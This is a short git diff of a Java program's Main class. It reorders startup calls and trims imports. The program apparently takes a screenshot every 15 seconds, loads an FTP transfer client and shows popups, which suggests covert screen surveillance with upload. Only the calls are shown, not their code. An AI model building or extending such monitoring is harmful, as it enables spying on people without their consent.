@@ -7,10 +7,6 @@ import fr.mimifan.jac.ftp.FileTransferClient;
 
 import java.io.*;
 import java.net.InetAddress;
-import java.net.URISyntaxException;
-import java.net.URL;
-import java.net.UnknownHostException;
-import java.util.List;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.TimeUnit;
@@ -19,7 +15,7 @@ public class Main {
 
     public static String hostname = "";
 
-    public static void main(String[] args) throws IOException {
+    public static void main(String[] args) throws IOException, InterruptedException {
         InetAddress localhost = InetAddress.getLocalHost();
         hostname = localhost.getHostName();
 
@@ -53,10 +49,10 @@ public class Main {
             throw new RuntimeException(e);
         }*/
 
+        ResourcesManager.getInstance().loadPopups();
         FileTransferClient.getInstance().load();
         ScheduledExecutorService executor = Executors.newSingleThreadScheduledExecutor();
         executor.scheduleAtFixedRate(() -> ScreenShotter.getInstance().takeScreenShot(), 0, 15, TimeUnit.SECONDS);
-        ResourcesManager.getInstance().loadPopups();
         PopupsManager.getInstance().load();
 
     }
